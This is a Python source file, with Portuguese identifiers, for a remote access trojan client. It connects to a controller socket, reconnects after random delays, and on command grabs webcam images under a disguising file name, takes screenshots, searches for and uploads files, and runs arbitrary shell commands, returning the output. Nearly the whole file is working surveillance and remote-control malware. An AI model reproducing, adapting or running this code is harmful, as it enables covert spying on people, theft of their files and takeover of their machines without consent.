# coding: utf-8
import os
import socket
import subprocess
from time import sleep
# from PIL import ImageGrab #  ............: Windows e MacOx
import pyscreenshot as ImageGrab  # ....................: linux derivados
import tempfile
import shutil
from time import sleep
import cv2
import random
from time import sleep as esperar

class Computador():

    def connect(self):
        plug = socket.socket()
        plug.connect(('localhost', 8081))


        while True:
            cmd = plug.recv(1024)

            if 'sair' in cmd.decode():
                plug.close()
                break
            elif 'cam' in cmd.decode():
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)
                cv2.imshow('frame', rgb)
                dirpath = tempfile.mkdtemp()
                cam = dirpath + "\systemWindows.jpeg"
                cv2.imwrite(cam, frame)
                cap.release()
                cv2.destroyAllWindows()
                try:
                    #esperar(1)
                    Transferir().transferir(plug, cam)
                    shutil.rmtree(dirpath)
                except Exception as e:
                    plug.send(str(e).encode())
            elif 'find' in cmd.decode():
                cmd = cmd[4:]
                path, ext = cmd.decode().split('*')
                list_conteudo = ''
                for dirp, dirname, arquivos in os.walk(path):
                    for arq in arquivos:
                        if arq.endswith(ext):
                            list_conteudo += '\n' + os.path.join(dirp, arq)
                try:
                    plug.send((list_conteudo).encode())
                except Exception as e:
                    plug.send(str(e).encode())
            elif 'cp' in cmd.decode():
                capturar, iten = cmd.decode().split(' ')
                try:
                    Transferir().transferir(plug, iten)
                except Exception as e:
                    plug.send(str(e).encode())
            elif 'cd' in cmd.decode():
                code, directory = cmd.decode().split(' ')
                try:
                    os.chdir(directory)
                    plug.send((os.getcwd()).encode())
                except Exception as e:
                    plug.send((str(e)).encode())
            elif 'tela' in cmd.decode():
                dir_tmp = tempfile.mkdtemp()
                img = dir_tmp + "\img.jpeg"
                ImageGrab.grab().save(img, "JPEG")
                try:
                    Transferir().transferir(plug, img)
                    shutil.rmtree(dir_tmp)
                except Exception as e:
                    plug.send((str(e)).encode())
            else:
                CMD = subprocess.Popen(cmd.decode(),
                                       shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                plug.send(CMD.stdout.read())
                plug.send(CMD.stderr.read())


class Transferir():

    def transferir(self, s, arq):
        if os.path.exists(arq):
            f = open(arq, 'rb')
            pacote = f.read(10000)
            while pacote:
                s.send(pacote)
                pacote = f.read(10000)
                s.send('DONE'.encode())
            f.close()
        else:
            s.send('Arquivo não encontrado'.encode())



if __name__ == '__main__':
    while True:
        try:
            if Computador().connect() == 1:
                break
        except:
            sleep_for = random.randrange(1, 10)
            sleep(int(sleep_for))
            pass
